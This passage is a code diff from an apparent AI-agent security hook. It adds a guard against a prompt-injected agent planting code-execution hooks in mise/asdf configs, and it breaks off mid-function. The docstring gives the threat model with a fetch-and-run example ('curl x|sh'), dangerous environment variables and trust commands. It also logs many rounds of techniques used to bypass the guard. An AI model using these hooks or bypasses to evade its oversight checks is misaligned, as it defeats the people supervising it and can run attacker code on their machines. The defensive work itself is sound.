@@ -11189,6 +11189,7 @@ _FETCH_HUMAN_ESCAPABLE = (
     (patterns.GO_ENV_FILE_PATH_RE, "a Go toolchain env file"),
     (patterns.HTTP_CLIENT_RC_PATH_RE, "a curl/wget config file (.curlrc/.wgetrc)"),
     (patterns.EDITOR_STARTUP_PATH_RE, "an editor startup/init file (vimrc/nvim/emacs.d)"),
+    (patterns.MISE_PATH_RE, "a mise/asdf config (mise.toml/.tool-versions) or plugin/shim dir"),
 )
 
 
@@ -15238,6 +15239,637 @@ def rule_editor_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
                      "cannot."))
 
 
+# ---- mise / asdf config exec hijack: human-escapable --------------------------
+def _mise_allowed_path(cfg: dict, p: str) -> bool:
+    """`allow` regexes are matched against the lexically NORMALIZED path, so
+    `allowed/../mise.toml` cannot satisfy `allow: ['allowed/']`."""
+    try:
+        norm = os.path.normpath(str(p).replace("\\", "/"))
+    except Exception:
+        return False
+    return _http_client_config_allowed_by_policy(cfg, norm) and ".." not in norm.split("/")
+
+
+def _mise_allowed_cmd(cfg: dict, cmd: str) -> bool:
+    """For a shell command an `allow` regex must match the WHOLE command
+    (fullmatch): a substring match would let `allowed-thing; mise trust`
+    or a trailing `# allowed-thing` comment ride along."""
+    allow = cfg.get("allow") or []
+    if isinstance(allow, str):
+        allow = [allow]
+    elif not isinstance(allow, (list, tuple)):
+        return False
+    for pat in allow:
+        try:
+            if re.fullmatch(str(pat), cmd.strip(), re.IGNORECASE | re.DOTALL):
+                return True
+        except re.error:
+            continue
+    return False
+
+
+_MISE_DELETE_WORDS = frozenset(("delete", "remove", "rm", "unlink", "trash"))
+_MISE_NOUN_WORDS = frozenset(("file", "files", "path", "paths", "item", "items",
+                              "entry", "dir", "directory", "fs"))
+
+
+def _mise_path_shaped(v) -> bool:
+    if not isinstance(v, str):
+        return False
+    t = v.strip()
+    if not t or "\n" in t or not _HTTP_RC_PATH_SHAPE_RE.match(t) and not re.match(
+            r"^[\w.\-]+(?:[/\\][^\r\n]*)?$", t):
+        return False
+    m = None
+    for m in patterns.MISE_PATH_RE.finditer(t):
+        pass
+    return bool(m) and re.fullmatch(r"[ .]*(?::[^\s/\\]*)?(?:[/\\][^\r\n]*)?", t[m.end():]) is not None
+
+
+def _mise_mcp_delete_only(ev: Event) -> bool:
+    if ev.action != ActionClass.MCP:
+        return False
+    words = _http_rc_words(str(ev.tool or "").split("__")[-1])
+    if not (words & _MISE_DELETE_WORDS) or (words - _MISE_DELETE_WORDS - _MISE_NOUN_WORDS):
+        return False
+    return not _editor_startup_has_content_key(ev.args or {})
+
+
+def _mise_target_kind(ev: Event, p: str) -> tuple:
+    """(kind, path) for a write target, matched on the raw path, its
+    URL-decoded form, its lexically normalized form, and joined onto the
+    event cwd when relative (QA round 8: `conf.d/../config.toml`, a bare
+    `config.toml` with cwd `~/.config/mise`, `file:///x/mise%2Etoml`)."""
+    if not isinstance(p, str) or not p or "\n" in p or len(p) > 4096:
+        return "", p
+    cands = [p]
+    q = p
+    if q.lower().startswith("file://"):
+        q = urllib.parse.unquote(q[7:])
+        cands.append(q)
+    elif "%" in q:
+        cands.append(urllib.parse.unquote(q))
+    for c in list(cands):
+        c2 = c.replace("\\", "/")
+        cands.append(posixpath.normpath(c2))
+        if ev.cwd and not c2.startswith(("/", "~", "$")) and not re.match(r"^[A-Za-z]:", c2):
+            cands.append(posixpath.normpath(posixpath.join(str(ev.cwd).replace("\\", "/"), c2)))
+    for c in cands:
+        k = patterns.mise_kind(c)
+        if k:
+            return k, p
+    return "", p
+
+
+_MISE_MCP_KEYS = ("mise", "rtx", "asdf", "tool-versions", "default-", ".toml", ".lock",
+                  "%", "config", "..", "plugins", "shims", "installs", "trusted")
+_MISE_DIR_KEY_WORDS = frozenset(("dir", "directory", "folder", "parent", "cwd", "root", "base",
+                                 "path", "location", "target", "dest", "destination"))
+_MISE_NAME_KEY_WORDS = frozenset(("name", "filename", "basename", "file"))
+
+
+def _mise_mcp_item_content(a, p: str):
+    """Content of the one list item that names `p`, for a multi-file push
+    (`files: [{path, content}, ...]`) -- only when `p` is the ONLY
+    mise-path-shaped string anywhere in the call and that item carries
+    exactly one content key; otherwise None (judge everything joined).
+    QA round 3: items keyed `name`/`file`, a second list, or an item with
+    both `content` and `contents` rode along unjudged."""
+    if sum(1 for x in _flatten_strings(a) if _mise_path_shaped(str(x))) != 1:
+        return None
+    found = []
+
+    def walk(v, depth=0):
+        if depth > 8:
+            return
+        if isinstance(v, dict):
+            if any(isinstance(x, str) and x.strip() == p for x in v.values()):
+                found.append(v)
+            for x in v.values():
+                walk(x, depth + 1)
+        elif isinstance(v, list):
+            for x in v:
+                walk(x, depth + 1)
+    walk(a)
+    if len(found) != 1 or found[0] is a:
+        return None
+    item = found[0]
+    ckeys = [k for k in item if _http_rc_words(k) & _ED_CONTENT_KEY_WORDS]
+    if len(ckeys) != 1 or not isinstance(item[ckeys[0]], str):
+        return None
+    if any(isinstance(v, (dict, list)) for v in item.values()):
+        return None
+    return item[ckeys[0]]
+
+
+def _mise_new_unsafe(ev: Event, p: str, kind: str) -> list:
+    """Labels of exec-bearing constructs the call would ADD to the file.
+    Write/Edit/MultiEdit/MCP edits are applied to the on-disk file and the
+    parsed before/after construct sets are diffed (formatting-independent
+    fingerprints), so an unrelated edit to a file that already carries a
+    human-set hook is not re-litigated, while uncommenting or re-spelling
+    one counts as adding it."""
+    a = ev.args or {}
+    if _http_rc_mcp_read_only(ev) or _mise_mcp_delete_only(ev):
+        return []
+    if kind == "dir":
+        return ["<write into a mise/asdf plugin, shim or install directory>"]
+    if kind == "lock":
+        return ["<write to the mise lockfile (pins every tool's download URL/checksum)>"]
+    if kind == "pkgs":
+        return ["<write to a mise default-packages list (installed after every new tool version)>"]
+    if kind == "trust":
+        return ["<write to mise's trust store (a file here IS `mise trust`)>"]
+    if ev.action == ActionClass.MCP:
+        if _http_rc_words(str(ev.tool or "").split("__")[-1]) & _HTTP_RC_COPY_WORDS:
+            return ["<copied/moved from another file>"]
+        for k in _HTTP_RC_NON_CONTENT_KEYS:
+            v = a.get(k)
+            if isinstance(v, str) and v.strip() and v.strip() != p \
+                    and _HTTP_RC_PATHLIKE_RE.match(v.strip()):
+                pn = str(p).replace("\\", "/").rstrip("/")
+                vn = v.strip().replace("\\", "/").rstrip("/")
+                if not (pn == vn or pn.startswith(vn + "/")):
+                    return [f"<content from another file: {v.strip()[:60]}>"]
+    edits, unreplayable = _http_rc_edit_list(a)
+    if unreplayable and ev.action in (ActionClass.MCP, ActionClass.EDIT):
+        return ["<edit shape not replayable against the file on disk>"]
+    before = _npmrc_read(ev, p)
+    if len(edits) > 500 or len(edits) * len(before or "") > 50_000_000:
+        # Replay cost is edits x file size; fail closed (QA round 12).
+        return ["<too many edits to replay>"]
+    content = a.get("content", a.get("contents"))
+    if content is not None and not isinstance(content, str):
+        # Non-string content (a JSON object an MCP server serializes): judged
+        # as its JSON text, which is not TOML and so fails closed.
+        content = json.dumps(content, default=str)
+    if edits:
+        if before is None:
+            return ["<edit not verifiable against the file on disk>"]
+        after = _npmrc_apply_edits(before, edits)
+        if after is None:
+            return ["<edit not verifiable against the file on disk>"]
+    elif isinstance(content, str):
+        after = content
+    elif ev.action == ActionClass.MCP and _mise_mcp_item_content(a, p) is not None:
+        # A multi-file push (`files: [{path, content}, ...]`): judge the
+        # mise item's own content, not every file's joined (QA round 2).
+        after = _mise_mcp_item_content(a, p)
+    elif ev.action == ActionClass.MCP:
+        body = [x for x in _http_rc_mcp_strings(ev, a) if x.strip() and x.strip() != p]
+        after = "\n".join(body)
+    else:
+        after = "\n".join(x for x in _http_rc_written_strings(a) if x != p)
+    had = [fp for _, fp in patterns.mise_unsafe_entries(before or "", kind)]
+    added = []
+    for label, fp in patterns.mise_unsafe_entries(after, kind):
+        if fp in ("<unparseable>", "<oversized>"):
+            # Never cancelled against the old file: an already-broken file
+            # must not make every later broken write pass (QA round 8).
+            added.append(label)
+        elif fp in had:
+            had.remove(fp)
+        else:
+            added.append(label)
+    if kind == "toml" and before:
+        # Removing a human-set `paranoid`/`gpg_verify = true` (QA round 2).
+        sw_before = patterns.mise_toml_safety_switches(before) or set()
+        sw_after = patterns.mise_toml_safety_switches(after)
+        if sw_after is not None:
+            added.extend(f"removes settings.{k} = true" for k in sorted(sw_before - sw_after))
+    return added
+
+
+def rule_mise_exec_protect(ev: Event, policy=None) -> Optional[Decision]:
+    """Gate planting an exec-bearing construct in a mise (formerly rtx) or
+    asdf config -- ``mise.toml``/``.mise.toml``/``mise.local.toml``/
+    ``mise.<env>.toml``, ``.mise/config.toml``, ``.config/mise.toml``,
+    ``~/.config/mise/config.toml`` and ``conf.d/*.toml``, ``/etc/mise/``,
+    legacy ``.rtx.toml``, and ``.tool-versions`` -- any write into the
+    mise/asdf plugin, shim or install trees (``~/.local/share/mise/
+    {plugins,shims,installs}``, ``~/.asdf/{plugins,shims,installs}``), and
+    the CLI forms that do the same without a file write (``mise trust``,
+    ``mise settings set trusted_config_paths``, ``mise set LD_PRELOAD=``,
+    ``mise config set``, ``mise use ubi:x/y``, ``mise plugins install``,
+    ``asdf plugin add``, ``MISE_TRUSTED_CONFIG_PATHS=``/``MISE_PARANOID=``
+    environment overrides).
+
+    PLAN / THREAT MODEL: with ``mise activate`` in the shell rc (mise's
+    recommended setup), every prompt and every ``cd`` runs ``mise
+    hook-env``, which loads each ``mise.toml`` from the cwd up to ``/``
+    plus the global config; so do ``mise exec``/``mise run`` and every shim.
+    A prompt-injected agent -- or a cloned repo it was asked to set up --
+    can make that load run code, unattended, for the human, a teammate or
+    CI: ``[hooks] enter = "curl x|sh"`` (also ``cd``/``leave``/
+    ``preinstall``/``postinstall``), ``[[watch_files]] run``, ``[env]
+    _.source = "x.sh"`` (bash sourced at activation), ``_.path`` (PATH
+    shadowing), ``_.file``, exported variables such as ``LD_PRELOAD``/
+    ``NODE_OPTIONS``/``BASH_ENV``/``PROMPT_COMMAND``/``PS1``/
+    ``GIT_SSH_COMMAND``/``*_PROXY``/``PIP_INDEX_URL``/``XDG_CONFIG_HOME``/
+    ``ANTHROPIC_BASE_URL``/``MISE_*``, a Tera ``{{ exec(command=...) }}``
+    in any string value, ``[plugins]`` from a git URL, ``[tools]`` with a
+    code-fetching backend (``ubi:``/``github:``/``http:``/``npm:``/
+    ``cargo:``/``go:``/``pipx:``/``vfox:``/``asdf:``), a ``path:`` version
+    or tool options (``postinstall``), ``[tool_alias]`` remapping ``node``
+    to one of those, and ``[settings]`` that remove mise's own checks
+    (``trusted_config_paths``, ``paranoid = false``, ``yes``,
+    ``url_replacements``, ``gpg_verify = false``, shell overrides). It is
+    the direnv ``.envrc`` threat (``rule_direnv_protect``) for the tool
+    that has largely replaced direnv+asdf, and no existing guard named any
+    of these paths. mise's defense is ``mise trust`` -- a CLI the agent can
+    run itself, like ``direnv allow`` -- so the trust/settings commands are
+    gated as the activation half; the global config is trusted implicitly.
+
+    Unlike an editor init file, ``mise.toml`` has a large routine subset
+    (``[tools] node = "22"``, ``[env] NODE_ENV``, ``[tasks]``), so the
+    content check PARSES the file (``tomllib``) rather than gating every
+    write: only the constructs above are gated, and an edit is applied to
+    the on-disk file and the before/after construct sets are diffed by
+    canonical fingerprint -- uncommenting or re-spelling a construct counts
+    as adding it, an unrelated edit next to a human-set hook does not.
+    ``[env]``'s dangerous-variable test is a denylist (exact names,
+    prefixes, suffixes, with a small benign-exception set); ``[settings]``
+    is an allowlist. Unparseable TOML, an oversized file, an edit that
+    cannot be replayed, or (on Python 3.10 without ``tomli``) any write
+    fails closed.
+
+    Edit/Write/MultiEdit: by target path. MCP: a shell-type tool is re-
+    judged as Bash; read-shaped and pure-delete tools pass; copy/move tools
+    and second-file sources are gated; the target may be named under any
+    key, as a patch header, or as a mapping key. Shell: a command naming a
+    mise path (literal, ``\\``-escaped, or as a glob/brace word) is gated
+    unless every simple command only reads/deletes (or is a non-writing
+    ``git`` subcommand -- ``git add mise.toml``); the CLI forms above are
+    gated by subcommand. ``curl -o mise.toml <url>`` is also caught by
+    ``rule_fetch_to_file_protect``, with which this guard's path regex is
+    registered.
+
+    Config (``policy.mise_exec``): ``mode`` (deny|ask|monitor|off, default
+    ask), ``allow`` (regexes; matched against the normalized path for file
+    writes, and against the WHOLE command for shell). Escapable only by a
+    human: a trailing ``# aegis-allow`` on the shell form, or
+    ``AEGIS_ALLOW_MISE_EXEC=1`` set before launch; a spawned agent can do
+    neither.
+
+    Honest scope -- the largest gap first: mise releases from 2026-08
+    (upstream #12107) IMPLICITLY trust the active project config for
+    ``mise exec``/``install``/``run``/``watch``/bare ``mise <task>`` (outside
+    ``paranoid`` mode), so a config DELIVERED rather than written by the
+    agent -- ``git clone``/``pull``/``apply``/``am``/``stash pop``, ``patch``,
+    an archive extract -- runs its hooks/``_.source``/template exec() on the
+    next ``mise install`` with no trust prompt and no tool call this guard
+    can judge. Gating every ``mise install``/``mise run`` would ask on the
+    most routine mise commands there are, so it is not done here; set
+    ``paranoid = true`` in the global config (a removal of which this guard
+    gates) to restore mise's own prompt. Also not covered: ``MISE_CONFIG_DIR``/``MISE_GLOBAL_CONFIG_FILE``/
+    ``MISE_DATA_DIR``/``ASDF_DATA_DIR`` relocations set OUTSIDE this
+    command (setting them inline is gated), task files (``[tasks]``,
+    ``.mise-tasks/``, ``mise-tasks/``, ``task_config.includes``) -- they run
+    only on an explicit ``mise run``, like a ``Makefile`` -- unless a hook
+    calls them (hooks are gated); a shell-side content check (a shell write
+    to a mise path asks regardless of content); unknown-name placement
+    into the config/plugin parents (``cp -r d ~/.asdf/``, ``tar xf x -C
+    ~/.config``) and bare ``*.toml`` globs; ``.asdfrc``/legacy idiomatic
+    version files (``.nvmrc``, ``.python-version``: version strings only);
+    ``mise generate`` forms other than ``git-pre-commit --write``; an
+    ``[env]`` variable outside the denylist that some program treats as
+    exec-bearing; and paths assembled indirectly -- the same "computed
+    indirectly" class every sibling guard discloses. Accepted false ASKs:
+    any shell command naming a mise path that is not a pure read/delete
+    verb or a non-writing ``git`` subcommand -- including reads by other
+    tools (``cp mise.toml /tmp``, ``tar czf x mise.toml``, ``find . -name
+    mise.toml``, ``taplo fmt``) and writes (``echo 'node 22' >>
+    .tool-versions``); common but code-fetching tool backends (``npm:``/
+    ``pipx:``/``cargo:``) on first add; ``[env]`` names that are often
+    routine but can carry exec (``JAVA_HOME``/``GOPATH``/``*_HOME``,
+    ``*PATH``, ``RUSTFLAGS``/``*FLAGS``, any ``NODE_OPTIONS``) and
+    ``_.path``/``_.file`` directives, on first add only; unparseable TOML;
+    a mise invocation longer than 400 words or 64 positional arguments
+    (fails closed);
+    ``-y``/``--yes`` on any mise command (before a ``run``/``exec`` task
+    name; after it, it is the task's own argument) and ``CI=`` on a mise command or ``export CI=`` beside one;
+    quoted text, commit messages and heredoc bodies that merely mention a
+    gated form (``git commit -m 'run mise trust'``) -- as
+    ``rule_direnv_protect`` does for ``direnv allow``.
+
+    QA history (two independent reviews, bypass-hunting and design/false-
+    positive, in parallel). Round 1 found: a newline between commands
+    (``mise ls\nmise trust``) merged them in the CLI tokenizer (shlex treats
+    ``\n`` as whitespace even when listed as punctuation) -- now a separator;
+    nested invocations (``mise x -- mise trust``, ``mise run -- asdf plugin
+    add``, ``mise exec -c "mise trust"``) -- every mise word in a command,
+    and every quoted multi-word argument, is now judged; ``mi\\se trust``
+    escaped the prefilter; ``mise settings unset paranoid``; non-dict args
+    failing open via a helper exception. False positives fixed: tool
+    options ``profile``/``components``/``targets``/``virtualenv``, nested
+    ``[settings.python] uv_venv_auto``-style keys, a bare ``mise
+    settings`` listing, and ``MISE_*`` names merely mentioned
+    (``printenv MISE_DATA_DIR``) -- only assignments/exports now count.
+    The parallel bypass review found: ``conf.d`` names with spaces/quotes/
+    200+ chars and env names with 3+ dot segments escaped the path regex;
+    ``--yes``/``-y`` on any mise command auto-accepts the untrusted-config
+    prompt (now gated like ``mise trust``), as does ``CI=`` next to mise;
+    ``"$(which mise)" trust``, ``xargs mise``, ``--profile``/``-P``; the
+    trust store (``~/.local/state/mise/trusted-configs/``, whose file
+    existence IS trust) and ``mise.lock`` are now gated paths;
+    ``_.python.venv = "tools"`` shadowed PATH (the last component must now
+    be venv-named); the template test was quadratic (now linear) and
+    fingerprints truncated at 4000 chars (now a full sha256); also added
+    ``[shell_alias]``, ``[prepare]``, ``vars._``, ``mise tool-alias set``,
+    ``BASH_FUNC_*``, ``LUA_INIT``, ``PHPRC``, ``CONFIG_SITE``, ``RSYNC_RSH``.
+    Round 2 (bypass) found: argv-shaped MCP exec tools newline-joined into
+    separate commands (the argv is now also judged space-joined); ``+=``,
+    ``\\``-escaped, ``export --`` and brace-word ``MISE_*`` assignments --
+    every assigned ``MISE_*``/``RTX_*`` name is now judged against the
+    settings allowlist (closing ``MISE_NODE_MIRROR_URL=`` too); ``$IFS``
+    splitting; ``mise link``/``sync``, ``mise local/global`` and ``asdf
+    set/local/global`` with ``path:``/``ref:`` versions; removing a human-set
+    ``paranoid``/``gpg_verify = true`` by Edit; zsh ``PROMPT``/``RPROMPT``;
+    ``.miserc.toml``, ``conf.d/.toml``, longer env-name chains. Round 2
+    (design) PASSED with should-fixes, closed: ``CI=`` and the prefilter now
+    need ``mise``/``rtx``/``asdf`` as a whole word (``promise``); template
+    test requires ``exec(``; CLI judging bounded (at most 64 mise words per
+    simple command, failing closed); a multi-file MCP push judges the mise
+    item's own content; distinct lockfile/trust-store labels; list-valued
+    ``command``; version-only aliases, frontend ``VITE_``/``NEXT_PUBLIC_``
+    constants and ``*_compile`` settings allowed. Round 3 found: padding
+    (``-E dev`` x200, 70 tool specs) pushed the real subcommand/spec past
+    the word bounds, which then judged the truncated rest -- truncation
+    now fails closed; computed subcommands (``mise $(echo trust)``,
+    ``${X:-trust}``, ``{trust,}``, ``xargs -I{} mise {}``) now ask; ``mise
+    asdf <args>`` forwarding, ``mise toml set``, ``mise shell-alias set``,
+    fish ``set -x MISE_YES``; the multi-file MCP item logic now applies only
+    when the mise path is the call's only one and its item has one content
+    key. The implicit-trust behaviour of current mise (above) was surfaced
+    here and is disclosed rather than gated. Round 4 found: an expansion
+    glued to the binary word (``mise$x trust``, ``mise$(true) trust``,
+    ``{mise,trust}``), ``xargs -I%``/``--replace``/``parallel`` (any mise
+    run under xargs/parallel now asks), ``-y`` after ``run``/``exec``
+    (``mise run -y test`` -- options up to the first positional now count),
+    globs as the subcommand (``mise tr?st``), ``~/.default-npm-packages``
+    and siblings (now gated paths), ``.tool-versions`` ``ref:http``. Round
+    5 found ``-y`` still hidden behind an option value or tool spec (``mise
+    exec node@22 -y --``, ``mise run -E dev --yes test``, ``mise tasks run
+    -y``) -- every pre-``--`` word of ``exec`` and every option (with its
+    value) before a ``run`` task name now counts; false ASKs on ``find
+    -exec grep mise {}``/``xargs grep mise`` (a mise word under xargs/find
+    is a mention only under a read-only tool); a quoted ``"{mise,x}"`` still
+    asks (the quote-stripped scan rendering expands it) -- accepted nit.
+    Round 6 found the round-5 "first word after the runner" narrowing hid
+    wrapped calls (``xargs env mise trust``, ``find -exec sudo mise trust``,
+    ``parallel -S host mise``) and quoted ``xargs -I% sh -c 'mise %'`` -- the
+    logic is inverted: a mise word under a runner is a mention only when the
+    runner's command is a known read-only tool (``grep``/``cat``/``ls``...),
+    and any quoted command naming mise under a runner asks; ``-y`` hidden
+    by an option value spelled like the subcommand (``mise -E run run -y``).
+    Round 7 found the read-only-tool list itself abusable: ``xargs echo
+    mise trust | sh`` (echo/printf removed), runner options that consume the
+    next word (``xargs --process-slot-var grep mise trust``, ``--arg``
+    abbreviations -- any option not known flag/value now keeps mise a call),
+    a path-qualified tool (``xargs ./echo``) or ``PATH=`` prefix, ``rg
+    --pre mise``/``--pager`` (now gated anywhere), and ``-y`` behind ``mise
+    run -s bash``/``--timeout 5s``. Round 8 (file-write half) found ``..``
+    paths (``~/.config/mise/conf.d/../config.toml``) and relative targets
+    inside a mise config dir (``config.toml`` with cwd ``~/.config/mise``,
+    ``cd ~/.config/mise && cp c config.toml``, MCP ``{dir, file_name}``) --
+    targets are now also matched normalized, URL-decoded and cwd-joined, and
+    a shell command run in / ``cd``-ing into a mise config dir is judged as
+    naming it; an already-unparseable file cancelling a later unparseable
+    write in the diff (sentinels now always count); git ``rename to``/
+    ``copy to`` patch headers; ``%2E``-encoded URIs; dict-form ``prefix:``/
+    ``ref:`` versions; whole-directory placement onto ``~/.config/mise``/
+    ``.mise``/the asdf and mise runtime dirs (shell and MCP move/copy).
+    Writing through a symlinked alias of a mise dir is not resolved -- the
+    engine-wide symlink gap sibling guards share. Round 9 found chained
+    ``cd``s (``cd ~/.config && cd mise && ...``) and bare relative
+    directory names (``cd ~/.config && cp -r evil mise``, cwd ``~/.config``)
+    -- every path word is now resolved against the event cwd and each
+    sequentially-tracked ``cd`` target; MCP directory placement now
+    normalizes/decodes/cwd-joins; ``$XDG_CONFIG_HOME/mise``; globs inside
+    runtime/trust-store/default-package paths (component-wise vocabulary
+    match) and a glob-named binary (``~/.local/bin/m*e trust``); more MCP
+    ``{path|location, name|file}`` shapes; shlex skipped above 50 KB.
+    Round 10 found the round-9 cwd-join a fail-open DoS (65 s on a 125 KB
+    cd x word cross product) and blind to obfuscated relative names
+    (``mi""se``, ``mi\\se``, ``mi?e``, ``--target-directory=mise``,
+    ``mise{,}``) -- words are now shell-dequoted, ``--opt=`` values and
+    brace/glob forms expanded, only mise-vocabulary words joined, and the
+    total work capped (failing closed); ``xargs m?se trust``. Accepted:
+    any non-read command run with the session cwd INSIDE a mise config
+    dir (``make`` in ``~/.config/mise``) asks. Round 11 found glob-variant
+    expansion over long multi-component words a fail-open DoS (now only the
+    last six components are substituted, cached per word); the caps failing
+    closed on routine CI scripts with many ``cd``s (dirs now normalized and
+    deduplicated, the join cap applies only when mise-vocabulary words
+    exist, plain brace words no longer count); known-name placement into a
+    parent (``cp -r /tmp/mise ~/.config/``, ``cd ~/.config && git clone
+    https://x/mise``) -- source basenames are now joined onto the
+    destination; ``mi$'s'e``; an MCP vocabulary prefilter bounding large
+    multi-item calls. Round 12 found the placement check fooled by a
+    trailing redirect (``cp -r /tmp/mise ~/.config/ 2>/dev/null`` -- the
+    tokenizer now keeps redirects inside their command and drops their fd
+    and target), ``git clone --depth 1 .../mise`` / ``git -C ~/.config
+    clone`` / ``env -C`` (valued clone options skipped; ``gh repo clone``,
+    ``git submodule add``, ``hg``/``svn`` checkouts added), ``cp -t DIR``/
+    ``--target-directory``; the MCP prefilter dropping relative targets when
+    the session cwd is a mise runtime dir; and three fail-open costs, now
+    bounded and failing closed: MCP discovery (500 candidate strings), glob
+    words (256 distinct), Edit replay (500 edits or 50 M edit-bytes).
+    Round 13 found long quoted glob words still costing ~230 ms each in
+    ``fnmatch`` (59 s total, at the hook timeout) -- components whose literal
+    characters exceed any mise name's length are now skipped and a
+    command-wide 4000-candidate budget fails closed; wrapper options hiding
+    a placement (``sudo -u u cp``, ``nice -n 5``, ``timeout 5``, ``stdbuf
+    -o0``, ``busybox``); a separator glued to a redirect (``a;>/dev/null cp
+    ...``); ``git -c x=y -C DIR``/``-CDIR``/repeated ``-C``; ``jj git
+    clone``; multi-line MCP content strings no longer count toward the MCP
+    budget. Round 14 found globs deep in an install path (``~/.local/share/
+    mise/inst*/node/22/bin/node``) missed since round 9 -- glob substitution
+    now keeps the literal prefix and covers the last 12 glob components of
+    the whole word; and wrapper forms hiding placement (``sudo -iu u``,
+    ``stdbuf -o 0``, ``taskset -c 0``, ``time -o f``, ``exec -a x``, ``sh -c
+    BODY`` / ``bash -lc``, ``jj --no-pager git clone``). Round 15 found
+    ``.miserc.toml`` judged with the mise.toml schema, so its top-level
+    ``override_config_filenames`` (load a config under an unguarded name)
+    and ``ignored_config_paths`` (drop the global config) passed -- it now
+    has its own allowlist (only ``env`` with plain names). Round 16
+    PASSED with no blocking findings (miserc locations, Edit/MCP replay,
+    related ``MISE_*`` env/settings forms and performance verified).
+    """
+    cfg = getattr(policy, "mise_exec", None) or {}
+    raw_mode = cfg.get("mode", "ask")
+    mode = str(raw_mode).lower()
+    if mode in ("off", "false") or raw_mode is False:
+        return None
+    action = Action.ASK if mode == "ask" else Action.DENY
+
+    def _finish(would: Decision) -> Optional[Decision]:
+        if mode == "monitor":
+            _record_monitor(ev, would, "mise-exec-protect-monitor")
+            return None
+        return would
+
+    if isinstance(ev.args, dict) and isinstance(ev.args.get("command"), (list, tuple)):
+        ev = Event.make(ev.event, tool=ev.tool, action=ev.action, cwd=ev.cwd,
+                        args={**ev.args, "command": " ".join(str(x) for x in ev.args["command"])})
+    if not isinstance(ev.args, dict):
+        # A non-dict payload would make the shared helpers raise, which the
+        # engine treats as allow (QA round 1) -- judge it as text instead.
+        raw_args = ev.args
+        txt = raw_args if isinstance(raw_args, str) else json.dumps(raw_args, default=str)[:400000]
+        ev = Event.make(ev.event, tool=ev.tool, action=ev.action, cwd=ev.cwd,
+                        args={"command": txt} if _is_shell(ev) else {"input": txt})
+
+    if ev.action == ActionClass.MCP:
+        shell_cmd = _http_rc_mcp_shell_command(ev)
+        if shell_cmd is not None:
+            sub = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
+                             args={"command": shell_cmd}, cwd=ev.cwd)
+            d = rule_mise_exec_protect(sub, policy)
+            if d is None and "\n" in shell_cmd:
+                # argv-shaped tools (`{command: mise, args: [trust]}`) come
+                # back newline-joined; judge the space-joined argv too (QA
+                # round 2).
+                sub = Event.make(HookEvent.PRE_TOOL_USE, tool="Bash",
+                                 args={"command": shell_cmd.replace("\n", " ")}, cwd=ev.cwd)
+                d = rule_mise_exec_protect(sub, policy)
+            if d is not None:
+                return Decision(d.action, d.rule, f"MCP tool '{ev.tool}' runs a "
+                                "command that touches mise/asdf config. " + d.message)
+            a0 = ev.args or {}
+            if isinstance(a0.get("command"), str) and re.fullmatch(r"\s*[A-Za-z_]{1,32}\s*", a0["command"]):
+                ev = Event.make(ev.event, tool=ev.tool, action=ev.action, cwd=ev.cwd,
+                                args={k: v for k, v in a0.items() if k != "command"})
+
+    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
+        p = _path(ev)
+        a = ev.args or {}
+        kind, p = _mise_target_kind(ev, p)
+        found = None
+        if not kind and ev.action == ActionClass.MCP:
+            # The session cwd is itself a mise dir: any relative string may
+            # be a target (QA round 12).
+            in_mise_dir = bool(ev.cwd) and bool(_mise_target_kind(ev, "./x")[0]
+                                                or patterns.MISE_CONFIG_DIR_RE.search(str(ev.cwd)))
+            examined = 0
+            for s_ in _flatten_strings(a):
+                s_ = str(s_)
+                ls_ = s_[:4096].lower()
+                if not in_mise_dir and ("\n" in s_ or not any(k in ls_ for k in _MISE_MCP_KEYS)):
+                    continue        # a multi-line string is content, never a path (QA round 13)
+                examined += 1
+                if examined > 500:
+                    # Bounded work, failing closed (QA round 12).
+                    kind, p, found = "toml", "<many path-like strings>", [
+                        "<MCP call too large to judge for mise paths>"]
+                    break
+                if _mise_path_shaped(s_):
+                    kind, p = patterns.mise_kind(s_.strip()), s_.strip()
+                    break
+                t_ = s_.strip()
+                if t_ and "\n" not in t_ and " " not in t_ and len(t_) < 4096 and (
+                        "/" in t_ or "\\" in t_ or t_.lower().endswith((".toml", ".lock"))
+                        or t_ == ".tool-versions"):
+                    k_, _ = _mise_target_kind(ev, t_)
+                    if k_:
+                        kind, p = k_, t_
+                        break
+            if not kind:
+                # `{dir: /x/.mise, file_name: config.toml}` (QA round 8).
+                dirs = [v for k, v in a.items() if isinstance(v, str)
+                        and _http_rc_words(k) & _MISE_DIR_KEY_WORDS]
+                names = [v for k, v in a.items() if isinstance(v, str)
+                         and (_http_rc_words(k) & _MISE_NAME_KEY_WORDS
+                              or str(k).lower() in ("file_name", "filename", "name"))]
+                names = [n for n in names if "/" not in n and "\\" not in n]
+                for d_ in dirs[:8]:
+                    for n_ in names[:8]:
+                        k_, _ = _mise_target_kind(ev, d_.rstrip("/\\") + "/" + n_)
+                        if k_:
+                            kind, p = k_, d_.rstrip("/\\") + "/" + n_
+                            break
+                    if kind:
+                        break
+            if not kind and (_http_rc_words(str(ev.tool or "").split("__")[-1])
+                             & _HTTP_RC_COPY_WORDS):
+                # Moving/copying/linking a whole directory onto a mise
+                # config dir (QA round 8).
+                for s_ in _flatten_strings(a):
+                    t_ = str(s_).strip()
+                    if not t_ or "\n" in t_ or len(t_) > 4096:
+                        continue
+                    if t_.lower().startswith("file://"):
+                        t_ = t_[7:]
+                    t_ = urllib.parse.unquote(t_)
+                    if ev.cwd:
+                        t_ = patterns._mise_join(str(ev.cwd), t_)
+                    t_ = patterns._ed_dotdot_normalize(t_.replace("\\", "/")).rstrip("/")
+                    m_ = patterns.MISE_CONFIG_DIR_RE.search(t_)
+                    if m_ and m_.end() >= len(t_) - 1:
+                        kind, p, found = "dir", str(s_), ["<directory placed onto a mise config/runtime dir>"]
+                        break
+            if not kind and not _http_rc_mcp_read_only(ev):
+                exempt = set()
+                if _path(ev) and "\n" not in _path(ev):
+                    exempt = {"content", "contents", "text", "body", "file_content", "new_content"}
+                for k_, v_ in a.items():
+                    if str(k_) in exempt:
+                        continue
+                    if any(patterns.mise_patch_hit(str(s_)) for s_ in _flatten_strings({k_: v_})):
+                        kind, p, found = "toml", "<patch>", ["<patch touching a mise/asdf config>"]
+                        break
+            if not kind and not _http_rc_mcp_read_only(ev):
+                for k_ in _http_rc_mapping_keys(a):
+                    if patterns.mise_kind(k_):
+                        kind, p, found = (patterns.mise_kind(k_), k_,
+                                          ["<content keyed by a mise/asdf config path>"])
+                        break
+        if not kind:
+            return None
+        if found is None:
